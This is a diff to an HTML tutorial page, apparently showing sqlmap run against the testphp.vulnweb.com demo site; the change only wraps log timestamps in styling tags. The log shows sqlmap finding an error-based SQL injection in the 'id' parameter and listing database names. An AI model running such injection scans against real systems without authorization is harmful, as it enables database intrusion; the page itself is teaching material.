@@ -241,15 +241,15 @@ We added the -dbs option so that the program not only tests for vulnerabilities 
 
 <div class="code-box2">[<span class="date">11:08:00</span>] [<span class="username">INFO</span>] testing connection to the target URL
 [<span class="date">11:08:01</span>] [<span class="username">INFO</span>] testing if the target URL content is stable
-[11:08:01] [<span class="username">INFO</span>] target URL content is stable
-[11:08:01] [<span class="username">INFO</span>] testing if GET parameter 'id' is dynamic
-[11:08:01] [<span class="username">INFO</span>] GET parameter 'id' appears to be dynamic
-[11:08:02] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
-[11:08:02] [<span class="username">INFO</span>] testing for SQL injection on GET parameter 'id'
-[11:08:02] [<span class="username">INFO</span>] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[11:08:05] [<span class="username">INFO</span>] testing 'Boolean-based blind - Parameter replace (original value)'
-[11:08:05] [<span class="username">INFO</span>] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[11:08:15] [<span class="username">INFO</span>] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] target URL content is stable
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] testing if GET parameter 'id' is dynamic
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] GET parameter 'id' appears to be dynamic
+[<span class="date">11:08:02</span>] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[<span class="date">11:08:02</span>] [<span class="username">INFO</span>] testing for SQL injection on GET parameter 'id'
+[<span class="date">11:08:02</span>] [<span class="username">INFO</span>] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[<span class="date">11:08:05</span>] [<span class="username">INFO</span>] testing 'Boolean-based blind - Parameter replace (original value)'
+[<span class="date">11:08:05</span>] [<span class="username">INFO</span>] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[<span class="date">11:08:15</span>] [<span class="username">INFO</span>] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</div><br>
 
 In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>
@@ -258,12 +258,12 @@ In the end, it will display the names of the databases, showing them with a [*] 
 web server operating system: Linux Ubuntu
 web application technology: PHP 5.6.40, Nginx 1.19.0
 back-end DBMS: MySQL >= 5.6
-[11:09:39] [<span class="username">INFO</span>] fetching database names
+[<span class="date">11:09:39</span>] [<span class="username">INFO</span>] fetching database names
 available databases [2]:
 [*] mywebsite_db
 [*] information_schema
 
-[11:09:41] [<span class="username">INFO</span>] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
+[<span class="date">11:09:41</span>] [<span class="username">INFO</span>] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
 
 <span class="username">andrew@local:~$</span></div>
 
